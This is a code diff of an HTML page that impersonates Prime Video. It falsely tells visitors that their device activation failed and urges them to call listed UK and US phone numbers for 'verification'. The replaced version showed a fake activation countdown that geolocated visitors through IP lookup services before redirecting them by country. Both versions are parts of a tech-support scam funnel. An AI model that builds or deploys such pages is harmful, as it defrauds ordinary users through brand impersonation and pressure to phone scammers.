@@ -1,135 +1,178 @@
-<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verifying — Prime Activation</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Prime Video – Phone Verification Required</title>
+
 <style>
-  :root{--bg:#0f1724;--card:#0b1220;--muted:#9aa8c0;--accent:#f59e2e}
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#081122,#0f1724);color:#e6eef8}
-  .wrap{max-width:720px;margin:40px auto;padding:18px}
-  .card{background:rgba(255,255,255,0.02);padding:26px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);text-align:center;box-shadow:0 18px 40px rgba(2,6,23,0.6)}
-  .status{background:transparent;color:var(--accent);padding:12px;border-radius:8px;font-weight:700;margin-bottom:14px;display:inline-block}
-  .code{font-family:monospace;font-weight:800;font-size:18px;letter-spacing:3px;color:var(--accent);background:transparent;padding:6px 10px;border-radius:8px;margin-left:8px;border:1px solid rgba(255,255,255,0.02)}
-  .msg{color:var(--muted);margin-top:8px}
-  .small{color:var(--muted);font-size:13px;margin-top:8px}
-  /* ring */
-  .ring-wrap{display:flex;align-items:center;justify-content:center;margin:18px 0}
-  .ring { width:160px; height:160px; position:relative; display:inline-block; }
-  .ring svg { transform: rotate(-90deg); width:100%; height:100%; display:block; }
-  .ring .center { position:absolute; inset:0; display:flex;align-items:center;justify-content:center; flex-direction:column; pointer-events:none; }
-  .ring .number { font-size:28px; font-weight:800; color:var(--accent); }
-  .ring .label { font-size:13px; color:var(--muted); margin-top:4px; }
-  .track { stroke: rgba(255,255,255,0.06); stroke-width:10; fill:none; }
-  .progress { stroke: var(--accent); stroke-width:10; stroke-linecap:round; fill:none; transition: stroke-dashoffset 0.3s linear; }
-  @media (max-width:420px) { .ring { width:130px; height:130px; } .ring .number { font-size:22px; } }
+:root{
+  --bg:#0f1724;
+  --card:#ffffff;
+  --dark:#0b1a33;
+  --blue:#4fa3e3;
+  --muted:#6b7280;
+  --danger:#fde2e2;
+  --dangerText:#b91c1c;
+}
+
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100vh;
+  font-family:Arial, Helvetica, sans-serif;
+  background:linear-gradient(180deg,#0b1220,#0f1724);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:16px;
+}
+
+/* MAIN CARD */
+.wrapper{
+  width:100%;
+  max-width:420px;
+  background:#f8fafc;
+  border-radius:18px;
+  padding:22px;
+  box-shadow:0 25px 60px rgba(0,0,0,.45);
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  font-size:26px;
+  font-weight:800;
+  color:#1e3a8a;
+}
+.logo span{
+  color:#38bdf8;
+}
+
+/* TITLE */
+h1{
+  font-size:22px;
+  margin:14px 0 8px;
+}
+.subtitle{
+  color:#475569;
+  font-size:14px;
+  line-height:1.5;
+}
+
+/* ERROR BOX */
+.alert{
+  background:var(--danger);
+  color:var(--dangerText);
+  padding:14px;
+  border-radius:12px;
+  margin:18px 0;
+  font-weight:600;
+}
+
+/* STEP */
+.step{
+  margin:18px 0 10px;
+  font-size:18px;
+  font-weight:700;
+  color:#0f172a;
+}
+
+/* CALL BUTTONS */
+.call-btn{
+  background:var(--blue);
+  color:#fff;
+  padding:16px;
+  border-radius:999px;
+  font-size:18px;
+  font-weight:700;
+  margin:14px 0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  text-decoration:none;
+}
+
+/* FINAL NOTE */
+.note{
+  background:#0b1a33;
+  color:#fff;
+  padding:16px;
+  border-radius:14px;
+  margin-top:16px;
+  font-size:14px;
+}
+
+/* FOOTER */
+.footer{
+  margin-top:18px;
+  font-size:12px;
+  color:#64748b;
+}
+
+/* MOBILE */
+@media(max-width:360px){
+  h1{font-size:20px}
+  .call-btn{font-size:16px}
+}
 </style>
-</head><body>
-<main class="wrap" role="main">
-  <section class="card" aria-live="polite">
-    <div id="notice" class="status" role="status" aria-atomic="true">Your activation code <span id="codeInline" class="code">A1B2C3</span> is being synced…</div>
+</head>
 
-    <div class="ring-wrap" aria-hidden="false">
-      <div class="ring" role="img" aria-label="Countdown">
-        <svg viewBox="0 0 100 100" preserveAspectRatio="xMidYMid meet">
-          <circle class="track" cx="50" cy="50" r="40"></circle>
-          <circle id="progressCircle" class="progress" cx="50" cy="50" r="40" stroke-dasharray="251.2" stroke-dashoffset="0"></circle>
-        </svg>
-        <div class="center">
-          <div id="countNum" class="number">10</div>
-          <div class="label">seconds</div>
-        </div>
-      </div>
-    </div>
+<body>
 
-    <div id="sub" class="msg">Please wait while we connect your device.</div>
-    <div class="small">If this takes longer than 30 seconds, contact our support team.</div>
-  </section>
-</main>
+<div class="wrapper">
 
-<!-- Tawk widget (kept) -->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/68556f6126a9b719089c1716/1iu6rm62a';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
+  <div class="logo">
+    prime <span>video</span>
+  </div>
+
+  <h1>Activation Error – Phone Verification Required</h1>
+
+  <div class="subtitle">
+    We were unable to complete activation of Prime Video on your TV/device.
+    Please call to complete activation.
+  </div>
+
+  <div class="alert">
+    Activation code: <strong id="code">BDIDNN</strong><br>
+    Your activation could not be completed.
+    A quick phone verification is required.
+  </div>
+
+  <div class="step">📞 Step 2: Phone Verification</div>
+
+  <a class="call-btn" href="tel:+442046383175">
+    🇬🇧 CALL +44 204 638 3175
+  </a>
+
+  <a class="call-btn" href="tel:+18773220260">
+    🇺🇸 CALL +1 877 322 0260
+  </a>
+
+  <div class="note">
+    As a final step, please contact our Activation Support Team
+    to verify your Prime Video device.
+  </div>
+
+  <div class="footer">
+    © MyTV — Activation Service
+  </div>
+
+</div>
 
 <script>
+/* get code from URL (?code=XXXX) */
 (function(){
-  // helpers
-  function getParam(k){ try{ return new URLSearchParams(location.search).get(k) || ''; }catch(e){ return ''; } }
-  function sanitizeCode(s){ try{ s = decodeURIComponent(s); }catch(e){}; return (s||'').toString().replace(/[^A-Z0-9\-\s]/ig,'').toUpperCase(); }
-
-  var code = sanitizeCode(getParam('code'));
-  if(!code) code = 'A1B2C3';
-  document.getElementById('codeInline').textContent = code;
-
-  var total = 10;
-  var remaining = total;
-  var display = document.getElementById('countNum');
-  var circle = document.getElementById('progressCircle');
-  var circumference = 2 * Math.PI * 40;
-  circle.style.strokeDasharray = String(circumference);
-
-  function setProgress(secLeft){
-    var progress = (total - secLeft) / total;
-    var offset = circumference * (1 - progress);
-    circle.style.strokeDashoffset = offset;
+  const p = new URLSearchParams(window.location.search);
+  const c = p.get('code');
+  if(c){
+    document.getElementById('code').textContent =
+      c.replace(/[^A-Z0-9]/gi,'').toUpperCase();
   }
-  // init
-  display.textContent = remaining;
-  setProgress(remaining);
-
-  // country detection: try sequentially ipapi.co, ipwho.is (fallback), geolocation-db, then navigator.language
-  function detectCountry(){
-    return fetch('https://ipapi.co/json/').then(r=>r.json()).then(d => d && (d.country_code || d.country) ? (d.country_code||d.country) : null).catch(()=>{
-      return fetch('https://ipwho.is/').then(r=>r.json()).then(d => d && d.country_code ? d.country_code : null).catch(()=>{
-        return fetch('https://geolocation-db.com/json/').then(r=>r.json()).then(d => d && (d.country_code || d.country) ? (d.country_code||d.country) : null).catch(()=>{
-          return null;
-        });
-      });
-    });
-  }
-
-  // countdown loop with visual animation
-  var step = 1;
-  var timer = setInterval(function(){
-    remaining -= step;
-    if(remaining < 0) remaining = 0;
-    display.textContent = remaining;
-    setProgress(remaining);
-    if(remaining <= 0){
-      clearInterval(timer);
-      // detect and redirect
-      detectCountry().then(function(countryCode){
-        var c = (countryCode||'').toString().slice(0,2).toUpperCase();
-        if(c==='GB' || c==='UK') location.assign('uk.html?code='+encodeURIComponent(code));
-        else if(c==='US') location.assign('us.html?code='+encodeURIComponent(code));
-        else location.assign('global.html?code='+encodeURIComponent(code));
-      }).catch(function(){
-        var c = (navigator.language || '').slice(0,2).toUpperCase();
-        if(c==='GB' || c==='UK') location.assign('uk.html?code='+encodeURIComponent(code));
-        else if(c==='US') location.assign('us.html?code='+encodeURIComponent(code));
-        else location.assign('global.html?code='+encodeURIComponent(code));
-      });
-    }
-  }, 1000);
-
-  // smoother visual using RAF
-  var start = performance.now();
-  function rafStep(now){
-    var elapsed = (now - start) / 1000;
-    var progress = Math.min(elapsed / total, 1);
-    var offset = circumference * (1 - progress);
-    circle.style.strokeDashoffset = offset;
-    if(progress < 1) requestAnimationFrame(rafStep);
-  }
-  requestAnimationFrame(rafStep);
 })();
 </script>
-</body></html>
+
+</body>
+</html>
